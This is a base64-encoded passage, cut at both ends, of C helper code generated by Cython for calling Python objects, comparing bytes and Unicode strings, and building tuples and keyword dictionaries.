KTtcbiAgICB9XG4jZW5kaWZcbiAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKG9iaiwgYXR0cl9uYW1lKTtcbiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkpIHtcbiAgICAgICAgX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cl9DbGVhckF0dHJpYnV0ZUVycm9yKCk7XG4gICAgfVxuICAgIHJldHVybiByZXN1bHQ7XG4jZW5kaWZcbn1cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldEJ1aWx0aW5OYW1lKFB5T2JqZWN0ICpuYW1lKSB7XG4gICAgUHlPYmplY3QqIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2IsIG5hbWUpO1xuICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSAmJiAhUHlFcnJfT2NjdXJyZWQoKSkge1xuICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfTmFtZUVycm9yLFxuICAgICAgICAgICAgIm5hbWUgXCclVVwnIGlzIG5vdCBkZWZpbmVkIiwgbmFtZSk7XG4gICAgfVxuICAgIHJldHVybiByZXN1bHQ7XG59XG5cblxuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgQ1lUSE9OX01FVEhfRkFTVENBTExcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpcbl9fUHl4X1B5VHVwbGVfRnJvbUFycmF5KFB5T2JqZWN0ICpjb25zdCAqc3JjLCBQeV9zc2l6ZV90IG4pXG57XG4gICAgUHlPYmplY3QgKnJlcztcbiAgICBQeV9zc2l6ZV90IGk7XG4gICAgaWYgKG4gPD0gMCkge1xuICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlKTtcbiAgICB9XG4gICAgcmVzID0gUHlUdXBsZV9OZXcobik7XG4gICAgaWYgKHVubGlrZWx5KHJlcyA9PSBOVUxMKSkgcmV0dXJuIE5VTEw7XG4gICAgZm9yIChpID0gMDsgaSA8IG47IGkrKykge1xuICAgICAgICBpZiAodW5saWtlbHkoX19QeXhfUHlUdXBsZV9TRVRfSVRFTShyZXMsIGksIHNyY1tpXSkgPCAoMCkpKSB7XG4gICAgICAgICAgICBQeV9ERUNSRUYocmVzKTtcbiAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICB9XG4gICAgICAgIFB5X0lOQ1JFRihzcmNbaV0pO1xuICAgIH1cbiAgICByZXR1cm4gcmVzO1xufVxuI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X2NvcHlfb2JqZWN0X2FycmF5KFB5T2JqZWN0ICpjb25zdCAqQ1lUSE9OX1JFU1RSSUNUIHNyYywgUHlPYmplY3QqKiBDWVRIT05fUkVTVFJJQ1QgZGVzdCwgUHlfc3NpemVfdCBsZW5ndGgpIHtcbiAgICBQeU9iamVjdCAqdjtcbiAgICBQeV9zc2l6ZV90IGk7XG4gICAgZm9yIChpID0gMDsgaSA8IGxlbmd0aDsgaSsrKSB7XG4gICAgICAgIHYgPSBkZXN0W2ldID0gc3JjW2ldO1xuICAgICAgICBQeV9JTkNSRUYodik7XG4gICAgfVxufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKlxuX19QeXhfUHlUdXBsZV9Gcm9tQXJyYXkoUHlPYmplY3QgKmNvbnN0ICpzcmMsIFB5X3NzaXplX3QgbilcbntcbiAgICBQeU9iamVjdCAqcmVzO1xuICAgIGlmIChuIDw9IDApIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSk7XG4gICAgfVxuICAgIHJlcyA9IFB5VHVwbGVfTmV3KG4pO1xuICAgIGlmICh1bmxpa2VseShyZXMgPT0gTlVMTCkpIHJldHVybiBOVUxMO1xuICAgIF9fUHl4X2NvcHlfb2JqZWN0X2FycmF5KHNyYywgKChQeVR1cGxlT2JqZWN0KilyZXMpLT5vYl9pdGVtLCBuKTtcbiAgICByZXR1cm4gcmVzO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKlxuX19QeXhfUHlMaXN0X0Zyb21BcnJheShQeU9iamVjdCAqY29uc3QgKnNyYywgUHlfc3NpemVfdCBuKVxue1xuICAgIFB5T2JqZWN0ICpyZXM7XG4gICAgaWYgKG4gPD0gMCkge1xuICAgICAgICByZXR1cm4gUHlMaXN0X05ldygwKTtcbiAgICB9XG4gICAgcmVzID0gUHlMaXN0X05ldyhuKTtcbiAgICBpZiAodW5saWtlbHkocmVzID09IE5VTEwpKSByZXR1cm4gTlVMTDtcbiAgICBfX1B5eF9jb3B5X29iamVjdF9hcnJheShzcmMsICgoUHlMaXN0T2JqZWN0KilyZXMpLT5vYl9pdGVtLCBuKTtcbiAgICByZXR1cm4gcmVzO1xufVxuI2VuZGlmXG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5Qnl0ZXNfRXF1YWxzKFB5T2JqZWN0KiBzMSwgUHlPYmplY3QqIHMyLCBpbnQgZXF1YWxzKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTCB8fFxcXG4gICAgICAgICEoQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUylcbiAgICByZXR1cm4gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKHMxLCBzMiwgZXF1YWxzKTtcbiNlbHNlXG4gICAgaWYgKHMxID09IHMyKSB7XG4gICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X0VRKTtcbiAgICB9IGVsc2UgaWYgKFB5Qnl0ZXNfQ2hlY2tFeGFjdChzMSkgJiBQeUJ5dGVzX0NoZWNrRXhhY3QoczIpKSB7XG4gICAgICAgIGNvbnN0IGNoYXIgKnBzMSwgKnBzMjtcbiAgICAgICAgUHlfc3NpemVfdCBsZW5ndGggPSBQeUJ5dGVzX0dFVF9TSVpFKHMxKTtcbiAgICAgICAgaWYgKGxlbmd0aCAhPSBQeUJ5dGVzX0dFVF9TSVpFKHMyKSlcbiAgICAgICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X05FKTtcbiAgICAgICAgcHMxID0gUHlCeXRlc19BU19TVFJJTkcoczEpO1xuICAgICAgICBwczIgPSBQeUJ5dGVzX0FTX1NUUklORyhzMik7XG4gICAgICAgIGlmIChwczFbMF0gIT0gcHMyWzBdKSB7XG4gICAgICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9ORSk7XG4gICAgICAgIH0gZWxzZSBpZiAobGVuZ3RoID09IDEpIHtcbiAgICAgICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X0VRKTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGludCByZXN1bHQ7XG4jaWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUyAmJiAoUFlfVkVSU0lPTl9IRVggPCAweDAzMEIwMDAwKVxuICAgICAgICAgICAgUHlfaGFzaF90IGhhc2gxLCBoYXNoMjtcbiAgICAgICAgICAgIGhhc2gxID0gKChQeUJ5dGVzT2JqZWN0KilzMSktPm9iX3NoYXNoO1xuICAgICAgICAgICAgaGFzaDIgPSAoKFB5Qnl0ZXNPYmplY3QqKXMyKS0+b2Jfc2hhc2g7XG4gICAgICAgICAgICBpZiAoaGFzaDEgIT0gaGFzaDIgJiYgaGFzaDEgIT0gLTEgJiYgaGFzaDIgIT0gLTEpIHtcbiAgICAgICAgICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9ORSk7XG4gICAgICAgICAgICB9XG4jZW5kaWZcbiAgICAgICAgICAgIHJlc3VsdCA9IG1lbWNtcChwczEsIHBzMiwgKHNpemVfdClsZW5ndGgpO1xuICAgICAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfRVEpID8gKHJlc3VsdCA9PSAwKSA6IChyZXN1bHQgIT0gMCk7XG4gICAgICAgIH1cbiAgICB9IGVsc2UgaWYgKChzMSA9PSBQeV9Ob25lKSAmIFB5Qnl0ZXNfQ2hlY2tFeGFjdChzMikpIHtcbiAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfTkUpO1xuICAgIH0gZWxzZSBpZiAoKHMyID09IFB5X05vbmUpICYgUHlCeXRlc19DaGVja0V4YWN0KHMxKSkge1xuICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9ORSk7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgaW50IHJlc3VsdDtcbiAgICAgICAgUHlPYmplY3QqIHB5X3Jlc3VsdCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKHMxLCBzMiwgZXF1YWxzKTtcbiAgICAgICAgaWYgKCFweV9yZXN1bHQpXG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShweV9yZXN1bHQpO1xuICAgICAgICBQeV9ERUNSRUYocHlfcmVzdWx0KTtcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4jZW5kaWZcbn1cblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlVbmljb2RlX0VxdWFscyhQeU9iamVjdCogczEsIFB5T2JqZWN0KiBzMiwgaW50IGVxdWFscykge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUxcbiAgICByZXR1cm4gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKHMxLCBzMiwgZXF1YWxzKTtcbiNlbHNlXG4gICAgaW50IHMxX2lzX3VuaWNvZGUsIHMyX2lzX3VuaWNvZGU7XG4gICAgaWYgKHMxID09IHMyKSB7XG4gICAgICAgIGdvdG8gcmV0dXJuX2VxO1xuICAgIH1cbiAgICBzMV9pc191bmljb2RlID0gUHlVbmljb2RlX0NoZWNrRXhhY3QoczEpO1xuICAgIHMyX2lzX3VuaWNvZGUgPSBQeVVuaWNvZGVfQ2hlY2tFeGFjdChzMik7XG4gICAgaWYgKHMxX2lzX3VuaWNvZGUgJiBzMl9pc191bmljb2RlKSB7XG4gICAgICAgIFB5X3NzaXplX3QgbGVuZ3RoLCBsZW5ndGgyO1xuICAgICAgICBpbnQga2luZDtcbiAgICAgICAgdm9pZCAqZGF0YTEsICpkYXRhMjtcbiAgICAgICAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9QeVVuaWNvZGVfUkVBRFkoczEpIDwgMCkgfHwgdW5saWtlbHkoX19QeXhfUHlVbmljb2RlX1JFQURZKHMyKSA8IDApKVxuICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgbGVuZ3RoID0gX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoczEpO1xuICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgICAgIGlmICh1bmxpa2VseShsZW5ndGggPCAwKSkgcmV0dXJuIC0xO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgbGVuZ3RoMiA9IF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKHMyKTtcbiAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICBpZiAodW5saWtlbHkobGVuZ3RoMiA8IDApKSByZXR1cm4gLTE7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBpZiAobGVuZ3RoICE9IGxlbmd0aDIpIHtcbiAgICAgICAgICAgIGdvdG8gcmV0dXJuX25lO1xuICAgICAgICB9XG4jaWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMU1xuICAgICAgICB7XG4gICAgICAgICAgICBQeV9oYXNoX3QgaGFzaDEsIGhhc2gyO1xuICAgICAgICAgICAgaGFzaDEgPSAoKFB5QVNDSUlPYmplY3QqKXMxKS0+aGFzaDtcbiAgICAgICAgICAgIGhhc2gyID0gKChQeUFTQ0lJT2JqZWN0KilzMiktPmhhc2g7XG4gICAgICAgICAgICBpZiAoaGFzaDEgIT0gaGFzaDIgJiYgaGFzaDEgIT0gLTEgJiYgaGFzaDIgIT0gLTEpIHtcbiAgICAgICAgICAgICAgICBnb3RvIHJldHVybl9uZTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuI2VuZGlmXG4gICAgICAgIGtpbmQgPSBfX1B5eF9QeVVuaWNvZGVfS0lORChzMSk7XG4gICAgICAgIGlmIChraW5kICE9IF9fUHl4X1B5VW5pY29kZV9LSU5EKHMyKSkge1xuICAgICAgICAgICAgZ290byByZXR1cm5fbmU7XG4gICAgICAgIH1cbiAgICAgICAgZGF0YTEgPSBfX1B5eF9QeVVuaWNvZGVfREFUQShzMSk7XG4gICAgICAgIGRhdGEyID0gX19QeXhfUHlVbmljb2RlX0RBVEEoczIpO1xuICAgICAgICBpZiAoX19QeXhfUHlVbmljb2RlX1JFQUQoa2luZCwgZGF0YTEsIDApICE9IF9fUHl4X1B5VW5pY29kZV9SRUFEKGtpbmQsIGRhdGEyLCAwKSkge1xuICAgICAgICAgICAgZ290byByZXR1cm5fbmU7XG4gICAgICAgIH0gZWxzZSBpZiAobGVuZ3RoID09IDEpIHtcbiAgICAgICAgICAgIGdvdG8gcmV0dXJuX2VxO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgaW50IHJlc3VsdCA9IG1lbWNtcChkYXRhMSwgZGF0YTIsIChzaXplX3QpKGxlbmd0aCAqIGtpbmQpKTtcbiAgICAgICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X0VRKSA/IChyZXN1bHQgPT0gMCkgOiAocmVzdWx0ICE9IDApO1xuICAgICAgICB9XG4gICAgfSBlbHNlIGlmICgoczEgPT0gUHlfTm9uZSkgJiBzMl9pc191bmljb2RlKSB7XG4gICAgICAgIGdvdG8gcmV0dXJuX25lO1xuICAgIH0gZWxzZSBpZiAoKHMyID09IFB5X05vbmUpICYgczFfaXNfdW5pY29kZSkge1xuICAgICAgICBnb3RvIHJldHVybl9uZTtcbiAgICB9IGVsc2Uge1xuICAgICAgICBpbnQgcmVzdWx0O1xuICAgICAgICBQeU9iamVjdCogcHlfcmVzdWx0ID0gUHlPYmplY3RfUmljaENvbXBhcmUoczEsIHMyLCBlcXVhbHMpO1xuICAgICAgICBpZiAoIXB5X3Jlc3VsdClcbiAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKHB5X3Jlc3VsdCk7XG4gICAgICAgIFB5X0RFQ1JFRihweV9yZXN1bHQpO1xuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbnJldHVybl9lcTpcbiAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9FUSk7XG5yZXR1cm5fbmU6XG4gICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfTkUpO1xuI2VuZGlmXG59XG5cblxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqIF9fUHl4X0dldEt3VmFsdWVfRkFTVENBTEwoUHlPYmplY3QgKmt3bmFtZXMsIFB5T2JqZWN0ICpjb25zdCAqa3d2YWx1ZXMsIFB5T2JqZWN0ICpzKVxue1xuICAgIFB5X3NzaXplX3QgaSwgbiA9IF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUoa3duYW1lcyk7XG4gICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgIGlmICh1bmxpa2VseShuID09IC0xKSkgcmV0dXJuIE5VTEw7XG4gICAgI2VuZGlmXG4gICAgZm9yIChpID0gMDsgaSA8IG47IGkrKylcbiAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpuYW1laSA9IF9fUHl4X1B5VHVwbGVfR0VUX0lURU0oa3duYW1lcywgaSk7XG4gICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAgICAgICBpZiAodW5saWtlbHkoIW5hbWVpKSkgcmV0dXJuIE5VTEw7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBpZiAocyA9PSBuYW1laSkgcmV0dXJuIGt3dmFsdWVzW2ldO1xuICAgIH1cbiAgICBmb3IgKGkgPSAwOyBpIDwgbjsgaSsrKVxuICAgIHtcbiAgICAgICAgUHlPYmplY3QgKm5hbWVpID0gX19QeXhfUHlUdXBsZV9HRVRfSVRFTShrd25hbWVzLCBpKTtcbiAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICAgICAgIGlmICh1bmxpa2VseSghbmFtZWkpKSByZXR1cm4gTlVMTDtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGludCBlcSA9IF9fUHl4X1B5VW5pY29kZV9FcXVhbHMocywgbmFtZWksIFB5X0VRKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KGVxICE9IDApKSB7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoZXEgPCAwKSkgcmV0dXJuIE5VTEw7XG4gICAgICAgICAgICByZXR1cm4ga3d2YWx1ZXNbaV07XG4gICAgICAgIH1cbiAgICB9XG4gICAgcmV0dXJuIE5VTEw7XG59XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuQ1lUSE9OX1VOVVNFRCBzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0t3YXJnc0FzRGljdF9GQVNUQ0FMTChQeU9iamVjdCAqa3duYW1lcywgUHlPYmplY3QgKmNvbnN0ICprd3ZhbHVlcykge1xuICAgIFB5X3NzaXplX3QgaSwgbmt3YXJncztcbiAgICBQeU9iamVjdCAqZGljdDtcbiNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICBua3dhcmdzID0gUHlUdXBsZV9TaXplKGt3bmFtZXMpO1xuICAgIGlmICh1bmxpa2VseShua3dhcmdzIDwgMCkpIHJldHVybiBOVUxMO1xuI2Vsc2VcbiAgICBua3dhcmdzID0gUHlUdXBsZV9HRVRfU0laRShrd25hbWVzKTtcbiNlbmRpZlxuICAgIGRpY3QgPSBQeURpY3RfTmV3KCk7XG4gICAgaWYgKHVubGlrZWx5KCFkaWN0KSlcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgZm9yIChpPTA7IGk8bmt3YXJnczsgaSsrKSB7XG4jaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAgICAgUHlPYmplY3QgKmtleSA9IFB5VHVwbGVfR2V0SXRlbShrd25hbWVzLCBpKTtcbiAgICAgICAgaWYgKCFrZXkpIGdvdG8gYmFkO1xuI2Vsc2VcbiAgICAgICAgUHlPYmplY3QgKmtleSA9IFB5VHVwbGVfR0VUX0lURU0oa3duYW1lcywgaSk7XG4jZW5kaWZcbiAgICAgICAgaWYgKHVubGlrZWx5KFB5RGljdF9TZXRJdGVtKGRpY3QsIGtleSwga3d2YWx1ZXNbaV0pIDwgMCkpXG4gICAgICAgICAgICBnb3RvIGJhZDtcbiAgICB9XG4gICAgcmV0dXJuIGRpY3Q7XG5iYWQ6XG4gICAgUHlfREVDUkVGKGRpY3QpO1xuICAgIHJldHVybiBOVUxMO1xufVxuI2VuZGlmXG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmFyZywgUHlPYmplY3QgKmt3KSB7XG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiAgICB0ZXJuYXJ5ZnVuYyBjYWxsID0gUHlfVFlQRShmdW5jKS0+dHBfY2FsbDtcbiAgICBpZiAodW5saWtlbHkoIWNhbGwpKVxuICAgICAgICByZXR1cm4gUHlPYmplY3RfQ2FsbChmdW5jLCBhcmcsIGt3KTtcbiAgICBpZiAodW5saWtlbHkoUHlfRW50ZXJSZWN1cnNpdmVDYWxsKCIgd2hpbGUgY2FsbGluZyBhIFB5dGhvbiBvYmplY3QiKSkpXG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIHJlc3VsdCA9ICgqY2FsbCkoZnVuYywgYXJnLCBrdyk7XG4gICAgUHlfTGVhdmVSZWN1cnNpdmVDYWxsKCk7XG4gICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpICYmIHVubGlrZWx5KCFQeUVycl9PY2N1cnJlZCgpKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoXG4gICAgICAgICAgICBQeUV4Y19TeXN0ZW1FcnJvcixcbiAgICAgICAgICAgICJOVUxMIHJlc3VsdCB3aXRob3V0IGVycm9yIGluIFB5T2JqZWN0X0NhbGwiKTtcbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aE8oUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcpIHtcbiAgICBQeU9iamVjdCAqc2VsZiwgKnJlc3VsdDtcbiAgICBQeUNGdW5jdGlvbiBjZnVuYztcbiAgICBjZnVuYyA9IF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfRlVOQ1RJT04oZnVuYyk7XG4gICAgc2VsZiA9IF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfU0VMRihmdW5jKTtcbiAgICBpZiAodW5saWtlbHkoUHlfRW50ZXJSZWN1cnNpdmVDYWxsKCIgd2hpbGUgY2FsbGluZyBhIFB5dGhvbiBvYmplY3QiKSkpXG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIHJlc3VsdCA9IGNmdW5jKHNlbGYsIGFyZyk7XG4gICAgUHlfTGVhdmVSZWN1cnNpdmVDYWxsKCk7XG4gICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpICYmIHVubGlrZWx5KCFQeUVycl9PY2N1cnJlZCgpKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoXG4gICAgICAgICAgICBQeUV4Y19TeXN0ZW1FcnJvcixcbiAgICAgICAgICAgICJOVUxMIHJlc3VsdCB3aXRob3V0IGVycm9yIGluIFB5T2JqZWN0X0NhbGwiKTtcbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbmRpZlxuXG5cbiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDAgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbF9mYWxsYmFjayhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKiBjb25zdCphcmdzLCBzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd2FyZ3MpIHtcbiAgICBQeU9iamVjdCAqYXJnc3R1cGxlO1xuICAgIFB5T2JqZWN0ICpyZXN1bHQgPSAwO1xuICAgIHNpemVfdCBpO1xuICAgIGFyZ3N0dXBsZSA9IFB5VHVwbGVfTmV3KChQeV9zc2l6ZV90KW5hcmdzKTtcbiAgICBpZiAodW5saWtlbHkoIWFyZ3N0dXBsZSkpIHJldHVybiBOVUxMO1xuICAgIGZvciAoaSA9IDA7IGkgPCBuYXJnczsgaSsrKSB7XG4gICAgICAgIFB5X0lOQ1JFRihhcmdzW2ldKTtcbiAgICAgICAgaWYgKF9fUHl4X1B5VHVwbGVfU0VUX0lURU0oYXJnc3R1cGxlLCAoUHlfc3NpemVfdClpLCBhcmdzW2ldKSAhPSAoMCkpIGdvdG8gYmFkO1xuICAgIH1cbiAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9DYWxsKGZ1bmMsIGFyZ3N0dXBsZSwga3dhcmdzKTtcbiAgYmFkOlxuICAgIFB5X0RFQ1JFRihhcmdzdHVwbGUpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG4jZW5kaWZcbiNpZiBDWVRIT05fVkVDVE9SQ0FMTCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwXG4gICAgI2RlZmluZSBfX1B5eF9QeVZlY3RvcmNhbGxfRnVuY3Rpb24oY2FsbGFibGUpIF9QeVZlY3RvcmNhbGxfRnVuY3Rpb24oY2FsbGFibGUpXG4gICNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuc3RhdGljIENZVEhPTl9JTkxJTkUgdmVjdG9yY2FsbGZ1bmMgX19QeXhfUHlWZWN0b3JjYWxsX0Z1bmN0aW9uKFB5T2JqZWN0ICpjYWxsYWJsZSkge1xuICAgIFB5VHlwZU9iamVjdCAqdHAgPSBQeV9UWVBFKGNhbGxhYmxlKTtcbiAgICAjaWYgZGVmaW5lZChfX1B5eF9DeUZ1bmN0aW9uX1VTRUQpXG4gICAgaWYgKF9fUHl4X0N5RnVuY3Rpb25fQ2hlY2tFeGFjdChjYWxsYWJsZSkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKGNhbGxhYmxlKTtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAgaWYgKCFQeVR5cGVfSGFzRmVhdHVyZSh0cCwgUHlfVFBGTEFHU19IQVZFX1ZFQ1RPUkNBTEwpKSB7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICBhc3NlcnQoUHlDYWxsYWJsZV9DaGVjayhjYWxsYWJsZSkpO1xuICAgIFB5X3NzaXplX3Qgb2Zmc2V0ID0gdHAtPnRwX3ZlY3RvcmNhbGxfb2Zmc2V0O1xuICAgIGFzc2VydChvZmZzZXQgPiAwKTtcbiAgICB2ZWN0b3JjYWxsZnVuYyBwdHI7XG4gICAgbWVtY3B5KCZwdHIsIChjaGFyICopIGNhbGxhYmxlICsgb2Zmc2V0LCBzaXplb2YocHRyKSk7XG4gICAgcmV0dXJuIHB0cjtcbn1cbiAgI2Vsc2VcbiAgICAjZGVmaW5lIF9fUHl4X1B5VmVjdG9yY2FsbF9GdW5jdGlvbihjYWxsYWJsZSkgUHlWZWN0b3JjYWxsX0Z1bmN0aW9uKGNhbGxhYmxlKVxuICAjZW5kaWZcbiNlbmRpZlxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgX25hcmdzLCBQeU9iamVjdCAqa3dhcmdzKSB7XG4gICAgUHlfc3NpemVfdCBuYXJncyA9IF9fUHl4X1B5VmVjdG9yY2FsbF9OQVJHUyhfbmFyZ3MpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAgIGlmIChuYXJncyA9PSAwICYmIGt3YXJncyA9PSBOVUxMKSB7XG4gICAgICAgIGlmIChfX1B5eF9DeU9yUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykgJiYgbGlrZWx5KCBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZMQUdTKGZ1bmMpICYgTUVUSF9OT0FSR1MpKVxuICAgICAgICAgICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRoTyhmdW5jLCBOVUxMKTtcbiAgICB9XG4gICAgZWxzZSBpZiAobmFyZ3MgPT0gMSAmJiBrd2FyZ3MgPT0gTlVMTCkge1xuICAgICAgICBpZiAoX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0NoZWNrKGZ1bmMpICYmIGxpa2VseSggX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9GTEFHUyhmdW5jKSAmIE1FVEhfTykpXG4gICAgICAgICAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhPKGZ1bmMsIGFyZ3NbMF0pO1xuICAgIH1cbiNlbmRpZlxuICAgIGlmIChrd2FyZ3MgPT0gTlVMTCkge1xuICAgICAgICAjaWYgQ1lUSE9OX1ZFQ1RPUkNBTExcbiAgICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgICAgICAgICAgc